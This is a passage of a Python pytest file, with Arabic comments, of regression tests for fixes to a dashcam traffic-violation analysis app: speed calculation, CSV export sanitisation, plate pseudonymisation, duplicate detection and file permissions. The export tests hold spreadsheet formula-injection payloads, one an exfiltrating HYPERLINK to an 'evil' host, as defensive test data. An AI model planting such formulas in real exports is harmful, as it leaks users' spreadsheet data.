"""اختبارات حارسة لخطة إصلاح مراجعة مِحَك (docs/reviews/mihak-review-2026-09-20.md).

كل اختبار هنا يفشل على الكود **قبل** الإصلاح ويمر بعده، ومكتوب ليمنع رجوع العيب
لا ليزيد نسبة التغطية. الترقيم يطابق أرقام بنود خطة الإصلاح في التقرير.
"""

from __future__ import annotations

import csv
import sys
from datetime import datetime
from pathlib import Path
from unittest.mock import patch

import pytest

from app.config import AppSettings
from app.core.analyzer import AnalysisConfig, AnalyzerService, Detection
from app.core.dashboard import DashboardService
from app.core.db import Database
from app.core.detectors.following_distance import FollowingDistanceDetector
from app.core.detectors.high_beam import HighBeamDetector
from app.core.detectors.speeding import SpeedingDetector
from app.core.exporter import export_csv, pseudonymize_plate, sanitize_cell
from app.core.library import LibraryService
from app.core.rules import build_tracks, detections_by_frame
from app.utils.geometry import speed_from_timed_centers_kmh
from app.utils.hash_utils import file_hash, full_file_hash
from app.utils.video_utils import VideoMetadata

FPS = 30.0
METERS_PER_PX = 0.05
# 10 بكسل/إطار × 0.05 م/بكسل × 30 إطار/ث × 3.6 = 54 كم/س
TRUE_SPEED_KMH = 54.0


def _moving_vehicle(
    *, stride: int, frames: int = 30, px_per_frame: float = 10.0
) -> list[Detection]:
    """مركبة تتحرك بسرعة ثابتة، مُعيَّنة كل `stride` إطاراً (كما يفعل المُحلِّل)."""
    out: list[Detection] = []
    for index in range(frames // stride + 1):
        frame_no = index * stride
        x = px_per_frame * frame_no
        out.append(
            Detection(
                frame_no=frame_no,
                timestamp_ms=int(1000 * frame_no / FPS),
                class_name="vehicle",
                confidence=0.9,
                bbox=(x, 0.0, x + 10.0, 10.0),
                track_id=1,
            )
        )
    return out


# ============================================
# 1 + 2. السرعة لا تتأثر بـframe_stride
# ============================================
@pytest.mark.parametrize("stride", [1, 2, 3, 5, 10])
def test_speed_is_invariant_to_frame_stride(stride: int) -> None:
    """نفس الحركة الفعلية تُعطي نفس السرعة أياً كان `frame_stride`.

    الحساب السابق كان `(عدد المراكز − 1) ÷ fps`، أي يفترض إطاراً واحداً بين كل
    مركزين — فتُضرَب السرعة في stride: 54 كم/س تُقرأ 270 عند stride=5، وتُسجَّل
    «سرعة زائدة» لكل مركبة في المقطع.
    """
    dets = _moving_vehicle(stride=stride)
    samples = [((d.bbox[0] + d.bbox[2]) / 2, d.timestamp_ms) for d in dets]
    timed = [((x, 5.0), ms) for x, ms in samples]
    speed = speed_from_timed_centers_kmh(timed, METERS_PER_PX)
    assert speed == pytest.approx(TRUE_SPEED_KMH, rel=0.05)


@pytest.mark.parametrize("stride", [1, 3, 5])
def test_speeding_detector_does_not_fire_below_limit_at_any_stride(stride: int) -> None:
    """مركبة بـ54 كم/س لا تُسجَّل مخالفة بحد 80 — ولو كان stride كبيراً."""
    dets = _moving_vehicle(stride=stride)
    violations = SpeedingDetector(speed_limit_kmh=80.0, meters_per_px=METERS_PER_PX).detect(
        build_tracks(dets), detections_by_frame(dets), [], fps=FPS
    )
    assert violations == []


@pytest.mark.parametrize("stride", [1, 3, 5])
def test_speeding_detector_reports_true_speed_at_any_stride(stride: int) -> None:
    """نصّ المخالفة يحمل السرعة الحقيقية لا مضروبةً في stride."""
    dets = _moving_vehicle(stride=stride)
    violations = SpeedingDetector(speed_limit_kmh=10.0, meters_per_px=METERS_PER_PX).detect(
        build_tracks(dets), detections_by_frame(dets), [], fps=FPS
    )
    assert len(violations) == 1
    reported = float(violations[0].notes.split()[1])
    assert reported == pytest.approx(TRUE_SPEED_KMH, rel=0.05)


def test_following_distance_speed_uses_timestamps() -> None:
    """كاشف المسافة الآمنة يبني TTC على سرعة غير متأثرة بالـstride."""
    detector = FollowingDistanceDetector(meters_per_px=METERS_PER_PX, min_speed_kmh=45.0)
    # سرعة حقيقية 54 كم/س > 45 فالفحص يستمر؛ لو ضُربت في stride لتجاوزت كل شيء
    dets = _moving_vehicle(stride=5, frames=120)
    tracks = build_tracks(dets)
    assert detector.detect(tracks, detections_by_frame(dets), [], fps=FPS) == []


class _RecordingProvider:
    def __init__(self) -> None:
        self.reads: list[int] = []

    def get_frame(self, frame_no: int):  # type: ignore[no-untyped-def]
        import numpy as np

        self.reads.append(frame_no)
        return np.full((60, 60, 3), 20, dtype=np.uint8)

    def close(self) -> None:
        pass


@pytest.mark.parametrize(("stride", "expected_gap"), [(1, 5), (3, 6), (5, 5)])
def test_high_beam_sampling_cadence_holds_across_strides(stride: int, expected_gap: int) -> None:
    """معدّل سحب الإطارات يبقى ثابتاً أياً كان الـstride.

    الشرط السابق `frame_no % 5 == 0` كان يصحّ عند stride=1 وحده: مع stride=3
    يُبقي مضاعفات 15 (سُدس المعدّل) وبتباعد غير منتظم.
    """
    dets = [
        Detection(
            frame_no=i * stride,
            timestamp_ms=int(1000 * i * stride / FPS),
            class_name="vehicle",
            confidence=0.9,
            bbox=(10.0, 10.0, 40.0, 40.0),
            track_id=1,
        )
        for i in range(60 // stride)
    ]
    provider = _RecordingProvider()
    HighBeamDetector(frame_provider=provider, sample_every_n_frames=5).detect(
        build_tracks(dets), {}, [], fps=FPS
    )
    gaps = [b - a for a, b in zip(provider.reads, provider.reads[1:], strict=False)]
    assert gaps, "لم يُقرأ أي إطار"
    assert max(gaps) == expected_gap
    assert min(gaps) == expected_gap  # تباعد منتظم لا متقطّع


# ============================================
# 3. تعطيل تقييم الصيغ في CSV/Excel
# ============================================
@pytest.mark.parametrize("payload", ["=1+1", "+1", "-1", "@SUM(A1)", '=HYPERLINK("http://x","go")'])
def test_sanitize_cell_neutralises_formula_prefixes(payload: str) -> None:
    assert sanitize_cell(payload) == "'" + payload


@pytest.mark.parametrize("payload", ["clip.mp4", "أ ب ج 1234", "", "0.85"])
def test_sanitize_cell_leaves_plain_text_untouched(payload: str) -> None:
    assert sanitize_cell(payload) == payload


def test_sanitize_cell_passes_non_strings_through() -> None:
    assert sanitize_cell(42) == 42
    assert sanitize_cell(None) is None


def test_export_csv_neutralises_formula_in_notes(tmp_path: Path, tmp_db: Database) -> None:
    """ملاحظة تبدأ بـ`=` تُكتب نصاً لا صيغة قابلة للتقييم في Excel."""
    from app.core.dashboard import ViolationRow

    row = ViolationRow(
        id=1,
        video_id=1,
        video_filename="clip.mp4",
        violation_type="manual_other",
        violation_type_ar="أخرى",
        start_ms=0,
        end_ms=1000,
        confidence=1.0,
        license_plate="=1+1",
        review_status="pending",
        notes='=HYPERLINK("http://evil/?"&A1,"اضغط")',
        created_at=None,
    )
    out = export_csv([row], tmp_path / "inj.csv")
    with out.open(encoding="utf-8-sig") as fp:
        record = next(iter(csv.DictReader(fp)))
    assert record["notes"].startswith("'=")
    assert record["license_plate"] == "'=1+1"


# ============================================
# 4. الكشوفات تُخزَّن في معاملة واحدة
# ============================================
def test_store_detections_is_atomic(tmp_db: Database, tmp_path: Path) -> None:
    """فشل الإدراج لا يترك المقطع بلا كشوفاته القديمة."""
    video = tmp_path / "clip.mp4"
    video.write_bytes(b"\x00" * 32)
    tmp_db.execute(
        "INSERT INTO videos (filepath, filename, fps, status) VALUES (?, 'clip.mp4', 30.0, 'imported')",
        (str(video),),
    )
    video_id = int(tmp_db.fetch_one("SELECT id FROM videos")[0])

    good = [
        Detection(
            frame_no=i,
            timestamp_ms=i * 33,
            class_name="vehicle",
            confidence=0.9,
            bbox=(0.0, 0.0, 10.0, 10.0),
            track_id=1,
        )
        for i in range(5)
    ]
    service = AnalyzerService(
        db=tmp_db, inference_fn=lambda path, config: good, settings=None  # type: ignore[arg-type]
    )
    config = AnalysisConfig(model_path=Path("unused.pt"))
    service.analyze_video(video_id, config)
    assert len(service.detections_for_video(video_id)) == 5

    # دفعة ثانية تفشل في منتصف الإدراج (صف بنوع غير صالح)
    class _Boom(list):
        def __iter__(self):  # type: ignore[no-untyped-def]
            raise RuntimeError("انقطاع أثناء الإدراج")

    broken_service = AnalyzerService(
        db=tmp_db,
        inference_fn=lambda path, config: _Boom(),  # type: ignore[arg-type,return-value]
    )
    with pytest.raises(RuntimeError):
        broken_service.analyze_video(video_id, config)

    # الكشوفات القديمة لم تُحذف بلا بديل
    assert len(service.detections_for_video(video_id)) == 5


# ============================================
# 6. التجهيل بمفتاح سرّي
# ============================================
def test_pseudonymize_plate_is_keyed_not_plain_hash() -> None:
    """الرمز يعتمد على الملح كمفتاح HMAC، فمَن لا يعرفه لا يبني جدول أقواس."""
    import hashlib

    plate = "أ ب ج 1234"
    code = pseudonymize_plate(plate, salt="secret-key")
    assert code is not None and code.startswith("PLATE-")
    # ليس sha256("salt::plate") — الصيغة القديمة القابلة للعكس بمعرفة الملح
    legacy = hashlib.sha256(f"secret-key::{plate}".encode()).hexdigest()[:10].upper()
    assert code != f"PLATE-{legacy}"
    # وثابت لنفس المفتاح، ومختلف باختلافه
    assert code == pseudonymize_plate(plate, salt="secret-key")
    assert code != pseudonymize_plate(plate, salt="other-key")


def test_ensure_anon_salt_generates_and_persists(tmp_path: Path, monkeypatch) -> None:
    """أول تشغيل يولّد ملحاً عشوائياً ويحفظه بدل ترك القيمة المنشورة."""
    import app.config as config_module

    env_file = tmp_path / ".env"
    monkeypatch.setattr(config_module, "_env_file_path", lambda: env_file)
    # setenv (لا delenv) حتى يُعيد monkeypatch الحالة الأصلية بعد الاختبار،
    # فالدالة تكتب المتغيّر مباشرة في os.environ ليُفعَّل في الجلسة الحالية.
    monkeypatch.setenv("BASEER_ANON_SALT", "placeholder-for-cleanup")
    config_module.reset_settings_cache()

    salt = config_module.ensure_anon_salt(
        config_module.AppSettings(anon_salt="baseer-default-salt")
    )
    assert salt != "baseer-default-salt"
    assert len(salt) >= 32
    assert "BASEER_ANON_SALT=" in env_file.read_text(encoding="utf-8")
    config_module.reset_settings_cache()


# ============================================
# 9. جاهزية مجمَّعة بأربعة استعلامات
# ============================================
def test_readiness_bulk_matches_single_and_batches_queries(
    tmp_db: Database, tmp_path: Path
) -> None:
    """النسخة المجمَّعة تُعطي نفس نتيجة المفردة بعدد استعلامات ثابت."""
    paths = []
    for i in range(3):
        path = tmp_path / f"clip{i}.mp4"
        path.write_bytes(b"\x00" * 16)
        paths.append(path)
        tmp_db.execute(
            "INSERT INTO videos (filepath, filename, fps, status) VALUES (?, ?, 30.0, 'imported')",
            (str(path), path.name),
        )
    ids = [int(r[0]) for r in tmp_db.fetch_all("SELECT id FROM videos ORDER BY id")]
    tmp_db.execute(
        "INSERT INTO detections (video_id, frame_no, timestamp_ms, class_name, confidence, "
        "bbox_x1, bbox_y1, bbox_x2, bbox_y2, track_id) VALUES (?, 0, 0, 'vehicle', 0.9, 0, 0, 1, 1, 7)",
        (ids[0],),
    )
    tmp_db.execute(
        "INSERT INTO zones (video_id, zone_type, polygon) VALUES (?, 'stop_line', '[[0,0],[1,1]]')",
        (ids[0],),
    )

    service = AnalyzerService(db=tmp_db)
    bulk = service.readiness_bulk(ids)
    assert set(bulk) == set(ids)
    for vid in ids:
        single = service.readiness(vid)
        assert bulk[vid].has_tracks == single.has_tracks
        assert bulk[vid].zone_types == single.zone_types
        assert bulk[vid].has_calibration == single.has_calibration
    assert bulk[ids[0]].has_tracks is True
    assert bulk[ids[1]].has_tracks is False
    assert "stop_line" in bulk[ids[0]].zone_types

    # عدد الاستعلامات لا ينمو مع عدد المقاطع
    calls: list[str] = []
    original = tmp_db.fetch_all

    def _counting(sql: str, params=None):  # type: ignore[no-untyped-def]
        calls.append(sql)
        return original(sql, params)

    tmp_db.fetch_all = _counting  # type: ignore[method-assign]
    try:
        service.readiness_bulk(ids)
    finally:
        tmp_db.fetch_all = original  # type: ignore[method-assign]
    assert len(calls) == 4, f"توقعنا 4 استعلامات مجمَّعة، جرى {len(calls)}"


def test_readiness_bulk_tolerates_missing_video(tmp_db: Database) -> None:
    """معرّف غير موجود يعود بجاهزية صفرية لا باستثناء."""
    service = AnalyzerService(db=tmp_db)
    result = service.readiness_bulk([999])
    assert result[999].has_detections is False
    assert result[999].blocked_detectors


# ============================================
# 13. لحظة المخالفة = وقت المقطع + إزاحتها داخله
# ============================================
def test_violation_hour_uses_offset_inside_clip(tmp_db: Database) -> None:
    """مخالفة بعد ساعتين من بداية مقطع سُجّل 22:30 تُحسب في الساعة 00 لا 22."""
    tmp_db.execute(
        "INSERT INTO videos (filepath, filename, recorded_at, fps, status) "
        "VALUES ('/tmp/a.mp4', 'a.mp4', ?, 30.0, 'analyzed')",
        (datetime(2026, 9, 20, 22, 30, 0),),
    )
    video_id = int(tmp_db.fetch_one("SELECT id FROM videos")[0])
    tmp_db.execute(
        "INSERT INTO violations (video_id, violation_type, start_ms, end_ms, confidence, source) "
        "VALUES (?, 'speeding', ?, ?, 0.9, 'auto')",
        (video_id, 2 * 3600 * 1000, 2 * 3600 * 1000 + 1000),
    )
    service = DashboardService(db=tmp_db)
    # 22:30 الأحد + ساعتان = 00:30 الاثنين: تتغيّر الساعة **واليوم** معاً، وهذا
    # بالضبط ما كان التجميع على `recorded_at` وحده يُخفيه.
    assert service.violations_by_hour() == [(0, 1)]
    assert service.violations_heatmap() == {(0, 0): 1}  # الاثنين 00:00


def test_count_violations_without_time_is_reported(tmp_db: Database) -> None:
    """المخالفات المستثناة من الرسوم الزمنية قابلة للعدّ بدل «لا توجد بيانات»."""
    tmp_db.execute(
        "INSERT INTO videos (filepath, filename, fps, status) "
        "VALUES ('/tmp/b.mp4', 'b.mp4', 30.0, 'analyzed')"
    )
    video_id = int(tmp_db.fetch_one("SELECT id FROM videos")[0])
    tmp_db.execute(
        "INSERT INTO violations (video_id, violation_type, start_ms, end_ms, confidence, source) "
        "VALUES (?, 'speeding', 0, 1000, 0.9, 'auto')",
        (video_id,),
    )
    service = DashboardService(db=tmp_db)
    assert service.violations_by_hour() == []
    assert service.count_violations_without_time() == 1


# ============================================
# 14. التكرار التام مؤكَّد بـhash كامل
# ============================================
def _video_with_same_partial_hash(directory: Path, name: str, middle: bytes) -> Path:
    """ملف بنفس الحجم والترويسة والذيل، ويختلف في وسطه فقط."""
    size = 12 * 1024 * 1024
    head = b"HEAD" * 1024
    tail = b"TAIL" * 1024
    body = bytearray(b"\x00" * size)
    body[: len(head)] = head
    body[-len(tail) :] = tail
    body[size // 2 : size // 2 + len(middle)] = middle
    path = directory / name
    path.write_bytes(bytes(body))
    return path


def test_partial_hash_collision_is_not_treated_as_duplicate(tmp_path: Path) -> None:
    """ملفان يتفقان في البصمة الجزئية ويختلفان فعلياً → لا يُسقط أحدهما."""
    first = _video_with_same_partial_hash(tmp_path, "a.mp4", b"AAAA")
    second = _video_with_same_partial_hash(tmp_path, "b.mp4", b"BBBB")

    assert file_hash(first) == file_hash(second), "الاختبار يفترض تصادماً في البصمة الجزئية"
    assert full_file_hash(first) != full_file_hash(second)

    from app.core.duplicates import confirmed_duplicate

    class _FakeDb:
        def fetch_all(self, sql: str, params=None):  # type: ignore[no-untyped-def]
            return [(1, str(first))]

    assert confirmed_duplicate(_FakeDb(), second, file_hash(second)) is False
    assert confirmed_duplicate(_FakeDb(), first, file_hash(first)) is True


def _fake_meta(path: Path) -> VideoMetadata:
    """بيانات وصفية محقونة — الاستيراد لا يحتاج ffprobe في الاختبار."""
    return VideoMetadata(
        filepath=path,
        duration_sec=10.0,
        width=1920,
        height=1080,
        fps=30.0,
        codec="h264",
        file_size_mb=12.0,
        recorded_at=datetime(2026, 1, 1, 8, 0, 0),
    )


def test_import_keeps_both_files_on_partial_hash_collision(
    tmp_path: Path, tmp_db: Database
) -> None:
    """الاستيراد يحفظ الملفين بدل رفض الثاني بصمت."""
    first = _video_with_same_partial_hash(tmp_path, "a.mp4", b"AAAA")
    second = _video_with_same_partial_hash(tmp_path, "b.mp4", b"BBBB")
    service = LibraryService(db=tmp_db)

    with patch("app.core.library.extract_metadata", _fake_meta):
        report = service.import_paths([first, second], generate_thumbnails=False)
    assert len(report.imported) == 2, f"مكررات كاذبة: {report.duplicates}"
    assert report.duplicates == []


def test_identical_file_is_still_dropped(tmp_path: Path, tmp_db: Database) -> None:
    """التكرار الحقيقي (نسخة طبق الأصل) يبقى مُسقَطاً."""
    original = _video_with_same_partial_hash(tmp_path, "a.mp4", b"AAAA")
    copy = tmp_path / "copy.mp4"
    copy.write_bytes(original.read_bytes())
    service = LibraryService(db=tmp_db)

    with patch("app.core.library.extract_metadata", _fake_meta):
        report = service.import_paths([original, copy], generate_thumbnails=False)
    assert len(report.imported) == 1
    assert len(report.duplicates) == 1


def test_duplicate_check_leaves_no_orphan_thumbnail(tmp_path: Path, tmp_db: Database) -> None:
    """فحص التكرار يسبق توليد الصورة المصغّرة فلا تبقى ملفات يتيمة."""
    original = _video_with_same_partial_hash(tmp_path, "a.mp4", b"AAAA")
    copy = tmp_path / "copy.mp4"
    copy.write_bytes(original.read_bytes())

    thumb_dir = tmp_path / "data" / "thumbnails"
    calls: list[Path] = []

    def _fake_thumbnail(src, dst, **kwargs):  # type: ignore[no-untyped-def]
        calls.append(Path(src))
        Path(dst).parent.mkdir(parents=True, exist_ok=True)
        Path(dst).write_bytes(b"\xff\xd8\xff")
        return Path(dst)

    settings = AppSettings(
        data_dir=tmp_path / "data",
        models_dir=tmp_path / "models",
        db_path=tmp_path / "data" / "results.duckdb",
        log_file=tmp_path / "logs" / "baseer.log",
    )
    service = LibraryService(db=tmp_db, settings=settings)
    with (
        patch("app.core.library.extract_metadata", _fake_meta),
        patch("app.core.library.generate_thumbnail", _fake_thumbnail),
    ):
        service.import_paths([original, copy], generate_thumbnails=True)

    assert calls == [original], "وُلّدت صورة مصغّرة لملف مكرر"
    assert len(list(thumb_dir.glob("*.jpg"))) == 1


# ============================================
# 24. صفوف التحرير بحقول مُسمّاة
# ============================================
def test_list_violations_for_editing_returns_named_rows(tmp_db: Database) -> None:
    tmp_db.execute(
        "INSERT INTO videos (filepath, filename, fps, status) "
        "VALUES ('/tmp/c.mp4', 'c.mp4', 30.0, 'analyzed')"
    )
    video_id = int(tmp_db.fetch_one("SELECT id FROM videos")[0])
    tmp_db.execute(
        "INSERT INTO violations (video_id, violation_type, start_ms, end_ms, confidence, "
        "license_plate, source, notes) VALUES (?, 'speeding', 100, 200, 0.9, 'أ ب ج 1', 'manual', 'x')",
        (video_id,),
    )
    (row,) = DashboardService(db=tmp_db).list_violations_for_editing()
    assert row.video_filename == "c.mp4"
    assert row.violation_type == "speeding"
    assert row.start_ms == 100
    assert row.license_plate == "أ ب ج 1"
    assert row.source == "manual"
    assert row.notes == "x"


# ============================================
# 7 + 25. إخفاقات العامل تُبلَّغ لا تُبتلع
# ============================================
def test_inference_worker_reports_failures(tmp_db: Database, tmp_path: Path) -> None:
    """المقطع الفاشل يظهر في تقرير العامل بدل أن يبقى في السجل وحده."""
    from app.workers.inference_worker import InferenceReport, InferenceWorker

    good = tmp_path / "good.mp4"
    good.write_bytes(b"\x00" * 16)
    tmp_db.execute(
        "INSERT INTO videos (filepath, filename, fps, status) VALUES (?, 'good.mp4', 30.0, 'imported')",
        (str(good),),
    )
    good_id = int(tmp_db.fetch_one("SELECT id FROM videos")[0])

    service = AnalyzerService(db=tmp_db, inference_fn=lambda path, config: [])
    worker = InferenceWorker(
        [good_id, 4242],  # الثاني غير موجود → ValueError داخل analyze_video
        AnalysisConfig(model_path=Path("unused.pt")),
        service=service,
    )
    received: list[object] = []
    worker.finished.connect(received.append)
    worker.run()

    assert len(received) == 1
    report = received[0]
    assert isinstance(report, InferenceReport)
    assert len(report.results) == 1
    assert len(report.failures) == 1
    assert "4242" in report.failures[0]
    assert report.cancelled is False


def test_extract_worker_collects_failures(tmp_db: Database) -> None:
    """عامل الاستخراج يُرجع تقريراً فيه الإخفاقات والعدد معاً."""
    from app.workers.extract_worker import ExtractReport, ExtractWorker

    class _Service:
        last_detector_failures: list[str] = ["RedLightDetector: boom"]

        def extract_violations(self, video_id: int) -> int:
            if video_id == 2:
                raise RuntimeError("تعذّر القراءة")
            return 3

    worker = ExtractWorker([1, 2], service=_Service())  # type: ignore[arg-type]
    received: list[object] = []
    worker.finished.connect(received.append)
    worker.run()

    report = received[0]
    assert isinstance(report, ExtractReport)
    assert report.total_violations == 3
    assert report.processed == 1
    assert any("#2" in f for f in report.failures)
    assert any("RedLightDetector" in f for f in report.failures)


# ============================================
# 5. بصمة النموذج تُطابق عند كل تحميل
# ============================================
def test_model_integrity_detects_replacement(tmp_path: Path) -> None:
    """ملف نموذج استُبدل بعد التنزيل لا يمر بصمت."""
    from app.core.model_integrity import (
        ModelIntegrityError,
        verify_model_file,
        write_sidecar,
    )

    model = tmp_path / "yolov8m.pt"
    model.write_bytes(b"trusted-weights")
    write_sidecar(model, full_file_hash(model))
    assert verify_model_file(model) is True

    model.write_bytes(b"malicious-pickle-payload")
    with pytest.raises(ModelIntegrityError) as excinfo:
        verify_model_file(model)
    assert "لا تطابق" in str(excinfo.value)


def test_model_integrity_without_sidecar_warns_only(tmp_path: Path) -> None:
    """نموذج بلا بصمة مسجَّلة يُحمَّل مع تحذير (قد يكون درّبه المستخدم بنفسه)."""
    from app.core.model_integrity import verify_model_file

    model = tmp_path / "custom.pt"
    model.write_bytes(b"user-trained")
    assert verify_model_file(model) is False


# ============================================
# 8. الخروج أثناء عمل عامل
# ============================================
def test_cancel_and_wait_stops_running_handles() -> None:
    """`cancel_and_wait` يُلغي وينتظر كل عامل يعمل ويُرجع عددها."""
    from app.workers.runner import cancel_and_wait

    class _Handle:
        def __init__(self, running: bool) -> None:
            self._running = running
            self.cancelled = False
            self.waited = False

        def is_running(self) -> bool:
            return self._running

        def cancel(self) -> bool:
            self.cancelled = True
            return True

        def wait(self, msecs: int = 5000) -> bool:
            self.waited = True
            return True

    running, idle = _Handle(True), _Handle(False)
    assert cancel_and_wait([running, idle]) == 1  # type: ignore[list-item]
    assert running.cancelled and running.waited
    assert not idle.cancelled and not idle.waited


# ============================================
# 12. جداول PDF تستغل العرض المتاح
# ============================================
def test_pdf_tables_use_available_width() -> None:
    """أعمدة الجداول بالسنتيمترات لا بالنقاط.

    `colWidths=[8, 4]` كانت تعني 12 نقطة (0.42 سم) داخل 17 سم متاحة، فالنص
    يفيض فوق الحدود ويتراكب — والاختبار القديم كان يتحقق من وجود الملف فقط.
    """
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.units import cm

    from app.core.dashboard import ViolationRow
    from app.core.exporter import _by_type_table, _kpi_table, _violations_table

    available = A4[0] - 4 * cm
    row = ViolationRow(
        id=1,
        video_id=1,
        video_filename="a_very_long_dashcam_filename_2026_riyadh_ring_road.mp4",
        violation_type="speeding",
        violation_type_ar="السرعة الزائدة",
        start_ms=0,
        end_ms=1000,
        confidence=0.9,
        license_plate=None,
        review_status="pending",
        notes=None,
        created_at=None,
    )
    for table in (
        _kpi_table({"total_videos": 3, "total_violations": 7, "avg_violations_per_video": 2.3}),
        _by_type_table([("speeding", 5)]),
        _violations_table([row]),
    ):
        width, _height = table.wrap(available, A4[1])
        assert width >= 0.6 * available, f"الجدول {width / cm:.2f} سم من {available / cm:.2f} سم"
        assert width <= available


# ============================================
# 25. اختبار دخان لنقطة الدخول
# ============================================
def test_main_configures_logging_and_starts(tmp_path: Path, monkeypatch) -> None:
    """`main()` تمرّ على كل خطوات الإقلاع دون شاشة — كانت بتغطية 0%."""
    import app.main as main_module
    from app.config import AppSettings

    settings = AppSettings(
        data_dir=tmp_path / "data",
        models_dir=tmp_path / "models",
        db_path=tmp_path / "data" / "results.duckdb",
        log_file=tmp_path / "logs" / "baseer.log",
    )
    database = Database(tmp_path / "data" / "app.duckdb")
    database.init_schema()

    calls: list[str] = []

    class _FakeApp:
        def __init__(self, argv):  # type: ignore[no-untyped-def]
            calls.append("app")

        def setApplicationName(self, name: str) -> None:  # noqa: N802
            calls.append("name")

        def setLayoutDirection(self, direction: object) -> None:  # noqa: N802
            calls.append("rtl")

        def setStyleSheet(self, sheet: str) -> None:  # noqa: N802
            calls.append("style")

        def setWindowIcon(self, icon: object) -> None:  # noqa: N802
            calls.append("icon")

        def exec(self) -> int:
            calls.append("exec")
            return 0

    class _FakeWindow:
        def __init__(self) -> None:
            calls.append("window")

        def setWindowIcon(self, icon: object) -> None:  # noqa: N802
            pass

        def show(self) -> None:
            calls.append("show")

    class _FakeIcon:
        """`QIcon` الحقيقي يحتاج QGuiApplication فعلياً — يُسقط العملية بلا واحدة."""

        def isNull(self) -> bool:  # noqa: N802
            return True

    monkeypatch.setattr(main_module, "QApplication", _FakeApp)
    monkeypatch.setattr(main_module, "MainWindow", _FakeWindow)
    monkeypatch.setattr(main_module, "_load_app_icon", _FakeIcon)
    monkeypatch.setattr(main_module, "get_settings", lambda: settings)
    monkeypatch.setattr(main_module, "get_database", lambda s=None: database)
    monkeypatch.setattr(main_module, "ensure_anon_salt", lambda s=None: "test-salt")
    monkeypatch.setattr(main_module, "_warn_if_ffmpeg_missing", lambda logger: None)

    try:
        assert main_module.main() == 0
    finally:
        database.close()
    assert calls.count("app") == 1
    assert "window" in calls and "show" in calls and "exec" in calls
    assert settings.log_file.parent.exists()


def test_main_shows_dialog_when_startup_fails(tmp_path: Path, monkeypatch) -> None:
    """فشل التهيئة يُعرض في نافذة لا في stdout (غير موجود في بناء PyInstaller)."""
    import app.main as main_module

    shown: list[Exception] = []

    class _FakeApp:
        def __init__(self, argv):  # type: ignore[no-untyped-def]
            pass

        def setApplicationName(self, name: str) -> None:  # noqa: N802
            pass

        def setLayoutDirection(self, direction: object) -> None:  # noqa: N802
            pass

    def _boom() -> object:
        raise PermissionError("القاعدة مقفولة")

    monkeypatch.setattr(main_module, "QApplication", _FakeApp)
    monkeypatch.setattr(main_module, "get_settings", _boom)
    monkeypatch.setattr(main_module, "_show_startup_error", shown.append)
    monkeypatch.setattr(main_module, "_configure_logging", lambda: None)

    assert main_module.main() == 1
    assert isinstance(shown[0], PermissionError)


# ============================================
# 10 + 25. التصدير في عامل خلفي
# ============================================
@pytest.mark.parametrize("fmt", ["json", "csv", "xlsx"])
def test_export_worker_writes_file_and_records_entry(
    fmt: str, tmp_db: Database, tmp_path: Path
) -> None:
    """العامل يبني الدراسة ويكتب الملف ويُسجّل التصدير — كله خارج الـmain thread."""
    from app.workers.export_worker import ExportResult, ExportWorker

    tmp_db.execute(
        "INSERT INTO videos (filepath, filename, fps, status) "
        "VALUES ('/tmp/e.mp4', 'e.mp4', 30.0, 'analyzed')"
    )
    video_id = int(tmp_db.fetch_one("SELECT id FROM videos")[0])
    tmp_db.execute(
        "INSERT INTO violations (video_id, violation_type, start_ms, end_ms, confidence, "
        "license_plate, source) VALUES (?, 'speeding', 0, 1000, 0.9, 'أ ب ج 1234', 'auto')",
        (video_id,),
    )

    out = tmp_path / f"study.{fmt}"
    worker = ExportWorker(fmt, out, anonymize=True, service=DashboardService(db=tmp_db))
    results: list[object] = []
    stages: list[str] = []
    failures: list[str] = []
    worker.finished.connect(results.append)
    worker.progress.connect(stages.append)
    worker.failed.connect(failures.append)
    worker.run()

    assert failures == []
    assert len(results) == 1
    result = results[0]
    assert isinstance(result, ExportResult)
    assert result.output_path.exists()
    assert result.violations == 1
    assert stages, "لم يُبلَّغ عن أي مرحلة تقدّم"
    # التصدير مُسجَّل في جدول exports
    assert int(tmp_db.fetch_one("SELECT COUNT(*) FROM exports")[0]) == 1


def test_export_worker_anonymizes_plates(tmp_db: Database, tmp_path: Path) -> None:
    """التصدير المجهّل لا يكتب رقم اللوحة الحقيقي."""
    from app.workers.export_worker import ExportWorker

    tmp_db.execute(
        "INSERT INTO videos (filepath, filename, fps, status) "
        "VALUES ('/tmp/f.mp4', 'f.mp4', 30.0, 'analyzed')"
    )
    video_id = int(tmp_db.fetch_one("SELECT id FROM videos")[0])
    tmp_db.execute(
        "INSERT INTO violations (video_id, violation_type, start_ms, end_ms, confidence, "
        "license_plate, source) VALUES (?, 'speeding', 0, 1000, 0.9, 'أ ب ج 1234', 'auto')",
        (video_id,),
    )
    out = tmp_path / "anon.csv"
    ExportWorker("csv", out, anonymize=True, service=DashboardService(db=tmp_db)).run()

    content = out.read_text(encoding="utf-8-sig")
    assert "أ ب ج 1234" not in content
    assert "PLATE-" in content


def test_export_worker_reports_unknown_format(tmp_db: Database, tmp_path: Path) -> None:
    from app.workers.export_worker import ExportWorker

    worker = ExportWorker("docx", tmp_path / "x.docx", service=DashboardService(db=tmp_db))
    failures: list[str] = []
    worker.failed.connect(failures.append)
    worker.run()
    assert failures and "docx" in failures[0]


# ============================================
# 20. صلاحيات الملفات الحاوية بيانات شخصية/أسرار
# ============================================
@pytest.mark.skipif(sys.platform == "win32", reason="بتات POSIX لا معنى لها على ويندوز")
def test_generated_env_file_is_private(tmp_path: Path, monkeypatch) -> None:
    """ملف `.env` المولَّد يحوي ملح التجهيل — فلا يكون مقروءاً للجميع."""
    import app.config as config_module

    env_file = tmp_path / ".env"
    monkeypatch.setattr(config_module, "_env_file_path", lambda: env_file)
    monkeypatch.setenv("BASEER_ANON_SALT", "placeholder-for-cleanup")
    config_module.reset_settings_cache()

    config_module.ensure_anon_salt(config_module.AppSettings(anon_salt="baseer-default-salt"))
    config_module.reset_settings_cache()

    assert env_file.exists()
    assert env_file.stat().st_mode & 0o777 == 0o600


@pytest.mark.skipif(sys.platform == "win32", reason="بتات POSIX لا معنى لها على ويندوز")
def test_database_file_is_private(tmp_path: Path) -> None:
    """ملف القاعدة يحوي لوحات وأوقاتاً ومواقع — للمستخدم وحده."""
    db_path = tmp_path / "private.duckdb"
    database = Database(db_path)
    try:
        assert db_path.stat().st_mode & 0o777 == 0o600
    finally:
        database.close()


@pytest.mark.skipif(sys.platform == "win32", reason="بتات POSIX لا معنى لها على ويندوز")
def test_exports_directory_is_private(tmp_path: Path) -> None:
    """مجلد التصديرات يحوي دراسات فيها بيانات شخصية."""
